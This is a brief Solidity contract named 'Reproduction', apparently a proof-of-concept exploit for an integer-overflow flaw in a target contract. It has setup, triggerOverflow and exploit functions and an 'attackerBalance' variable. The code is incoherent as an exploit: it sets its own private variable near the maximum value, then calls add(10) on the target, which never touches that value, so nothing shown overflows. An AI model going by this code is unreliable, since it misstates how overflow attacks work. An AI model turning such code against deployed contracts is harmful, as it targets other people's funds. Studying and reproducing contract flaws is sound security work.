interface IOverflow {
    function add(uint value) external returns (bool);
}

contract Reproduction is IOverflow {
    uint private attackerBalance = 0;
    IOverflow private vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IOverflow(_vulnerableContract);
    }

    function setup() public {
        attackerBalance = type(uint).max - 10;
    }

    function triggerOverflow() public {
        vulnerableContract.add(10);
    }

    function exploit() public {
        setup();
        triggerOverflow();
    }

    function add(uint value) external override returns (bool) {
        return true;
    }
}